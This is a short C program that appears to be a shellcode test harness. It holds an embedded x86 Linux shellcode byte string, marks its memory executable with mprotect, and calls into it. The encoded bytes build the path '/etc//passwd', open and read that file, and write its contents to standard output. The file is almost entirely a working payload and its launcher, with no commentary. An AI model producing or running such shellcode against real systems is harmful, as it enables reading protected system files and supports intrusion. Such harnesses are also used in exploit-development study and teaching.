#include <sys/mman.h>
#include <stdio.h>

unsigned char code[] = "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\xcd\x80\x93\x91\xb0\x03\x66\xba\x01\x10\x4a\xcd\x80\x92\x29\xc0\xb0\x04\xb3\x01\xcd\x80\xb0\x01\xcd\x80";


int main(){
  printf("Shellcode length: %d\n", strlen(code));
  int r =  mprotect((void *)((int)code & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
  printf("mprotect: %d\n",r);
  int (*ret)() = (int(*)())code;
  return ret();
}
